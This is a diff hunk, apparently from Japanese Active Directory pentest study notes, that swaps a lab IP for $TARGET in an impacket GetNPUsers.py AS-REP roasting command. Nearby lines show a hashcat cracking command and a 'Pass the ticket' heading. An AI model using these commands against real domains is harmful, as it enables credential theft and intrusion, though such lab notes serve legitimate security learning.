@@ -119,7 +119,7 @@ hashcat -m 18200 hash.txt Pass.txt
 impacket はユーザーリストを与える必要はあるが、リモートで実行できる。
 
 ```sh
-python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip 10.10.194.124 controller.local/ -usersfile users.txt
+python3 /home/kali/tools/impacket/examples/GetNPUsers.py -dc-ip $TARGET controller.local/ -usersfile users.txt
 ```
 
 ## Pass the ticket
